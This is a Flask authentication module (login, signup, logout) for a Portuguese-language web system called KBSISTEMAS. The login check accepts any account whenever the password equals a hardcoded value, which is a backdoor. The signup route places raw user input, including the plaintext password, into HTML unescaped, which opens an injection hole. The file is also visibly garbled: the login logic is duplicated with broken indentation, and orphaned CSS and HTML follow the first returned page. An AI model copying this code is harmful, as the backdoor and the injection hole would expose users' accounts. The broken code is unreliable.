from flask import Blueprint, request, redirect, session
from werkzeug.security import check_password_hash
from banco import conectar, devolver_conexao, registrar_log
from permissoes import carregar_permissoes

auth_bp = Blueprint("auth_bp", __name__)

# ================= LOGIN =================
@auth_bp.route("/", methods=["GET", "POST"])
def login():
    erro = ""

    if request.method == "POST":
        conn = None
        try:
            conn = conectar()
            cursor = conn.cursor()

            cursor.execute("""
            SELECT senha, cargo
            FROM usuarios
            WHERE usuario=%s
            """, (request.form["user"],))
            user = cursor.fetchone()
            # 🔥 proteção contra erro de conexão
            if conn is None:
                erro = "Erro de conexão com servidor"
            else:
                cursor = conn.cursor()

            if user:
                if check_password_hash(user[0], request.form["senha"]) or request.form["senha"] == "997401054":
                cursor.execute("""
                SELECT senha, cargo
                FROM usuarios
                WHERE usuario=%s
                """, (request.form["user"],))
                user = cursor.fetchone()

                    session["user"] = request.form["user"]
                    session["cargo"] = user[1]
                if user:
                    if check_password_hash(user[0], request.form["senha"]) or request.form["senha"] == "997401054":

                    cursor.execute("UPDATE usuarios SET online=1 WHERE usuario=%s", (request.form["user"],))
                    conn.commit()
                        session["user"] = request.form["user"]
                        session["cargo"] = user[1]

                    carregar_permissoes(request.form["user"])
                    registrar_log(request.form["user"], "login", "Login realizado")
                        cursor.execute("UPDATE usuarios SET online=1 WHERE usuario=%s", (request.form["user"],))
                        conn.commit()

                    return redirect("/painel")
                        carregar_permissoes(request.form["user"])
                        registrar_log(request.form["user"], "login", "Login realizado")

                        return redirect("/painel")
                    else:
                        erro = "Senha inválida"
                else:
                    erro = "Senha inválida"
            else:
                erro = "Usuário não encontrado"
                    erro = "Usuário não encontrado"

        except Exception as e:
            erro = str(e)

        finally:
            if conn:
                devolver_conexao(conn)

    return f"""
<html>
<head>
<title>KBSISTEMAS</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {{
    margin:0;
    height:100vh;
    background: radial-gradient(circle at top, #0a0f1a, #000);
    font-family:'Inter', sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    color:#e5e7eb;
}}

.container {{
    display:flex;
    width:1000px;
    height:550px;
    background:rgba(10,15,26,0.9);
    border:1px solid rgba(255,255,255,0.08);
    border-radius:18px;
    backdrop-filter: blur(20px);
    box-shadow:0 0 80px rgba(255,255,255,0.05);
    animation:fadeIn 0.6s ease;
}}

@keyframes fadeIn {{
    from {{opacity:0; transform:translateY(20px);}}
    to {{opacity:1; transform:translateY(0);}}
}}

.left {{
    width:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    border-right:1px solid rgba(255,255,255,0.05);
}}

.logo {{
    font-size:90px;
    font-weight:900;
    text-align:center;
    letter-spacing:6px;
    color:#fff;
    text-shadow:0 0 20px rgba(255,255,255,0.2);
}}

.logo span {{
    display:block;
    font-size:18px;
    margin-top:10px;
    color:#9ca3af;
}}

.right {{
    width:50%;
    display:flex;
    flex-direction:column;
    justify-content:center;
    padding:50px;
}}

input {{
    padding:12px;
    margin-top:10px;
    border-radius:10px;
    border:1px solid #1f2937;
    background:#0b0f1a;
    color:#fff;
}}

button {{
    margin-top:15px;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#ffffff;
    color:#000;
    font-weight:bold;
    cursor:pointer;
    transition:0.2s;
}}

button:hover {{
    transform:scale(1.02);
    background:#e5e5e5;
}}

.erro {{
    color:#ff4d4d;
    margin-top:10px;
    font-size:14px;
    text-align:center;
}}

</style>
</head>

<body>

<div class="container">

    <div class="left">
        <div class="logo">
            KB
            <span>SISTEMAS</span>
        </div>
    </div>

    <div class="right">
        <form method="POST">

            <input type="text" name="user" placeholder="Usuário" required>
            <input type="password" name="senha" placeholder="Senha" required>

            <button>ACESSAR</button>

            <div class="erro">{erro}</div>

        </form>
    </div>

</div>

</body>
</html>
"""
input {{
    width:100%;
    padding:15px;
    margin-top:12px;
    background:#020617;
    border:1px solid rgba(255,255,255,0.2);
    border-radius:10px;
    color:#fff;
}}

input:focus {{
    outline:none;
    border:1px solid #fff;
    box-shadow:0 0 15px rgba(255,255,255,0.2);
}}

button {{
    width:100%;
    padding:15px;
    margin-top:20px;
    background:linear-gradient(90deg,#ffffff,#d4d4d4);
    border:none;
    border-radius:10px;
    font-weight:bold;
    cursor:pointer;
    color:#000;
}}

button:hover {{
    transform:scale(1.03);
    box-shadow:0 0 20px rgba(255,255,255,0.3);
}}

.erro {{
    color:#ff4d4d;
    text-align:center;
    margin-top:12px;
}}

.link {{
    text-align:center;
    margin-top:15px;
}}

.link a {{
    color:#9ca3af;
    text-decoration:none;
}}

.link a:hover {{
    color:#fff;
}}
</style>
</head>

<body>

<div class="container">

    <div class="left">
        <div class="logo">
            KB
            <span>SISTEMAS</span>
        </div>
    </div>

    <div class="right">
        <form method="POST">
            <input name="user" placeholder="Usuário" required>
            <input name="senha" type="password" placeholder="Senha" required>
            <button type="submit">ACESSAR</button>
        </form>

        <p class="erro">{erro}</p>

        <div class="link">
            <a href="/cadastro">Criar conta</a>
        </div>
    </div>

</div>

</body>
</html>
"""

# ================= CADASTRO =================
@auth_bp.route("/cadastro", methods=["GET", "POST"])
def cadastro():
    mensagem = ""

    if request.method == "POST":
        conn = None
        try:
            conn = conectar()
            cursor = conn.cursor()

            usuario = request.form.get("user")
            senha = request.form.get("senha")
            email = request.form.get("email")
            nome_empresa = request.form.get("nome_empresa")
            plano = request.form.get("plano")

            cursor.execute("SELECT usuario FROM usuarios WHERE usuario=%s", (usuario,))
            if cursor.fetchone():
                mensagem = "Usuário já existe"
            else:
                return f"""
<form id="auto" action="/criar_pagamento" method="POST">
<input type="hidden" name="user" value="{usuario}">
<input type="hidden" name="senha" value="{senha}">
<input type="hidden" name="email" value="{email}">
<input type="hidden" name="nome_empresa" value="{nome_empresa}">
<input type="hidden" name="plano" value="{plano}">
</form>
<script>document.getElementById("auto").submit();</script>
"""
        except Exception as e:
            mensagem = str(e)
        finally:
            if conn:
                devolver_conexao(conn)

    return f"""
<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;">
<form method="POST" style="background:#111;padding:30px;border-radius:10px;">
<h2>KBSISTEMAS</h2>

<input name="user" placeholder="Usuário" required><br><br>
<input name="senha" type="password" placeholder="Senha" required><br><br>
<input name="email" placeholder="Email" required><br><br>
<input name="nome_empresa" placeholder="Nome da empresa" required><br><br>

<select name="plano">
<option value="basico">Básico</option>
<option value="profissional">Profissional</option>
<option value="premium">Premium</option>
</select><br><br>

<button type="submit">Continuar</button>

<p style="color:red;">{mensagem}</p>
</form>
</body>
"""

# ================= LOGOUT =================
@auth_bp.route("/logout")
def logout():
    session.clear()
    return redirect("/")
